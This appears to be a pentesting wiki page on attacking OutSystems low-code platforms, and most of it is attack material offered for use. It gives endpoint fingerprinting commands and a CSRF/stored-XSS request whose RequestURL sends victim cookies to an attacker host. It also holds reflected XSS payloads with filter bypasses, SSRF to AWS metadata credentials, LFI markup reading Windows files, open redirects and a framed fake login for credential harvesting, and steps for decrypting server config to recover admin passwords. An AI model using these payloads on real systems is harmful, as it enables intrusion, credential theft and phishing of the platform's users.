---
tags:
  - Web
---

# :material-apps: OutSystems

<span class="pill pill-hard">enterprise low-code</span> <span class="pill pill-info">web</span>

OutSystems is a low-code .NET/Java platform that ships a **fixed set of built-in
modules and endpoints** on every deployment. That predictability is the whole
game: the same reserved paths (`/ServiceCenter/`, `/ECT_Provider/`,
`/HtmlToPdfConverter/`, `/moduleservices/`) exist everywhere, so once you
fingerprint OutSystems you already have a target list.

!!! abstract "TL;DR"
    Confirm the platform via `/moduleservices/moduleinfo` and `PlatformVersionNumber`
    → walk the reserved endpoint list → chain the `/ECT_Provider` CSRF→StoredXSS
    WomboCombo, reflected XSS, and the `/HtmlToPdfConverter` SSRF→AWS-metadata / LFI.
    On-box, decrypt `server.hsconf` with `private.key` to recover DB/admin creds.

## :material-magnify: Fingerprint & version

```bash
# Platform confirmation + endpoint/module inventory
curl -s "https://$TARGET/moduleservices/moduleinfo"          # lists endpoints + installed modules
curl -s "https://$TARGET/moduleservices/moduleversioninfo"   # returns a version token
# Version string: view-source the login page, grep for PlatformVersionNumber
curl -s "https://$TARGET/users/Login.aspx" | grep -i PlatformVersionNumber
```

- Cloud deployments follow a naming convention — enumerate the environment tiers:
  `<OUTSYSTEMS_HOST>-dev.outsystemsenterprise.com`, `-tst`, `-lt` (LifeTime), and the
  bare production `<OUTSYSTEMS_HOST>.outsystemsenterprise.com`. `-lt` exposes
  `/LifeTimeSDK/`.
- [OutSystems-Scan](https://github.com/5O4R3S/OutSystems-Scan) automates fingerprint
  + endpoint discovery.

## :material-format-list-bulleted: Reserved endpoints

The backoffice / built-in modules exist on virtually every install. High-value first:

```text
/ServiceCenter/            # platform admin console (also /servicecenter/login.aspx)
/Users/  /users            # user management (also for SSO/application users)
/ADAuthProvider/  /LDAPAuthProvider/  /ADLogin/
/ECT_Provider/             # feedback provider — CSRF/StoredXSS (see below)
/HtmlToPdfConverter/       # render-to-pdf/image — SSRF + LFI (see below)
/PreviewInDevices/         # open-redirect / frame hijack (see below)
/RichWidgets/              # Popup_Upload.aspx — CVE-2020-29441
/fusioncharts/  /Charts/  /ChartingServicesCore/
/fileupload/  /CustomHandlers/  /jstree/  /enterprise/
/server.api/  /server.identity/  /SecurityUtils/
/RESTDevService/  /SOAPDevService/  /SAPDevService/  /appfeedbackapi/
/DBCleaner_API/  /PerformanceProbe/  /FactoryConfiguration/  /TemplateManager/
```

!!! loot "The endpoint list is the recon"
    Because these paths are platform-defined, a 403/401 still confirms the module is
    present. Reserved endpoints that reject you directly can often be reached
    server-side via the SSRF primitives below.

## :material-bug: WomboCombo — /ECT_Provider CSRF → StoredXSS → SSRF

`/ECT_Provider/AJAXSaveFeedback.aspx` (the "Give Feedback" widget) is vulnerable to
**CSRF + HTTP external-service interaction + Stored XSS** at once. The submitted
`HTML` parameter is later parsed, causing every referenced resource to be fetched —
authenticated with the victim's cookies — from the server in `RequestURL`. The
stored payload triggers in the "App Feedback" backoffice panel.

```http
POST /ECT_Provider/AJAXSaveFeedback.aspx HTTP/1.1
Host: $TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: <victim session>

espacekey=<K>&applicationkey=<K>&HTML=<payload>&RequestURL=http://<ATTACKER>/
```

- **Get `espacekey` / `applicationkey`** from `/<APP>/Login.aspx`, `/ServiceCenter/`,
  or `/Users/`. The client-side `_OSrequestInfoScript()` JS function also returns
  these UIDs.
- If POST errors, retry the request as **GET**.
- **Stored XSS payloads:**
  ```html
  <input onactivate=alert(2) autofocus="">   <!-- Edge only -->
  <svg><animate onbegin=alert(1) attributeName=x dur=1s>
  ```
- **SSRF pivot:** `/ECT_Provider` is usually permission-blocked, but the `RequestURL`
  fetch is performed by the server — point it at otherwise-reserved endpoints (or
  internal hosts) to reach them from the box.

## :material-fire: /HtmlToPdfConverter — SSRF → AWS metadata + LFI

The render add-on (`/HtmlToPdfConverter/HowToImage.aspx`,
`/HtmlToPdfConverter/HowToPDF.aspx`; path may vary per app) fetches a supplied page
server-side and renders it. On EC2 this reads the instance metadata service:

```text
# Serve an HTML page you control that pulls the credentials:
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

Same engine is vulnerable to **Local File Inclusion** — host an `index.html` with
`<object data=...>` pointing at local paths; the renderer loads them:

```html
<!DOCTYPE html><html><h2>win.ini</h2>
<object width="400" height="400" data="C:/windows/win.ini"></object><br>
<object width="600" height="600" data="C:/windows/system32/drivers/etc/hosts"></object>
</html>
```

See [SSRF](../web/ssrf.md) for the metadata-endpoint follow-up and IAM abuse.

## :material-script-text: Reflected XSS endpoints

```text
# MultipleFileUpload — qqfile reflected
/MultipleFileUpload/Upload.aspx?sessionid=<id>&supportedextensions=&qqsize=5&qqfile=zz<script>alert(1)</script>zz
/MultipleFileUploadV1_Pat/Upload.aspx?...&qqfile=<fullwidth < / > img onerror payload>

# File-download handler — 'documento' param reflected in the error page
/index.asp?MP=&MS=&MN=&documento="<img src=oi onerror=alert(8)>
#   (non-numeric filename forces an error page that reflects the payload)

# FusionCharts — reflection inside a <script> block, function-name filter
/fusioncharts/FusionCharts.aspx?...
#   filter blocks alert(6); bypass with (alert)(8) — never break JS syntax
```

## :material-link-off: Open redirect & frame-src hijacking

```text
# Logout OriginalURL open redirect
GET /Users/Logout.aspx?OriginalURL=http://<ATTACKER>/ HTTP/1.1

# PreviewInDevices — hostname-only URL validation
/PreviewInDevices/Preview.aspx?URL=<value>
```

`PreviewInDevices` often validates only the **hostname**, not the full authority
component — supply a crafted authority to bypass and induce an open redirect (with
user interaction, framed). If it returns a **Blocked URL** message, retry by dropping
the authority component and using a `<hostname>`-prefixed attacker domain; a
successful preview can frame a fake OutSystems login to harvest credentials (CSP
`frame-src` may block served content — bypasses welcome). See [Open Redirect](../web/open-redirect.md).

## :material-lock-open: Config decryption — server.hsconf

On a compromised platform server, DB and admin credentials are recoverable:

```text
C:\Program Files\OutSystems\Platform Server\private.key      # NOT an RSA key
C:\Program Files\OutSystems\Platform Server\server.hsconf    # XML config
```

- `private.key` is a **base64-encoded symmetric key** (despite the warning banner
  claiming it is a private encryption key).
- `server.hsconf` is XML; fields with `encrypted="true"` (`LogPassword`,
  `AdminPassword`, `RuntimePassword`) are **AES-128**.
- Ciphertext format is `$2$<IV><Ciphertext>` — `$2$` denotes the AES-128 scheme.
  Decrypt each field in CyberChef (AES, key = base64-decoded `private.key`, the
  embedded IV) to recover cleartext DB/admin passwords.

## :material-alert: Other bugs

```text
# Stored XSS in Dynamic Forms
/DynamicForms/Form_Show_Popup.aspx?FormId=<ID>   (…wtForm_Description sink)
/DynamicForms/FormDetail_Popup.aspx

# CVE-2020-29441 — unauthenticated arbitrary file upload (Platform 10 < 10.0.1019.0)
#   Endpoint: /RichWidgets/Popup_Upload.aspx
#   Impact: unauth upload → DB space exhaustion (DoS) / data corruption
#   Patch: PopupUpload_UseToken
```

## :material-link-variant: Related

- Built on [ASP.NET](aspnet.md); fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Primitives: [CSRF](../web/csrf.md), [Stored XSS](../web/xss.md), [SSRF](../web/ssrf.md) → [AWS](../cloud/aws.md), [Open Redirect](../web/open-redirect.md).
- Reference: [OutSystems-Scan](https://github.com/5O4R3S/OutSystems-Scan), [CVE-2020-29441](https://nvd.nist.gov/vuln/detail/CVE-2020-29441).
